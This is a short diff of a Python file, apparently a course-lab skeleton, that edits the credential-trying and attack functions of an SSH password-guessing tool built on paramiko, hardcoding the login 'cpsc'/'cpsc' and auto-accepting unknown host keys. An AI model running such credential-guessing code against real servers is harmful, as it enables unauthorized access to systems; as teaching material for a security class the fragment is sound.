@@ -125,9 +125,9 @@ def tryCredentials(host, userName, password, sshClient):
     # in the comments above the function
     # declaration (if you choose to use
     # this skeleton).
-    print("Now attempting to connect to host...")
+    print("Now trying credentials for " + host)
     try: # Try condition: make connection
-        sshClient.connect(host, username=userName,passW=password)
+        sshClient.connect(host, username="cpsc",password="cpsc")
         return 0 # Return success
     except paramiko.SSHException: # Except condition: Invalid credentials
         return 1                  # Return invalid credentials error status
@@ -152,7 +152,7 @@ def attackSystem(host):
 
     # Set some parameters to make things easier.
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
+
     # The results of an attempt
     attemptResults = None
                 
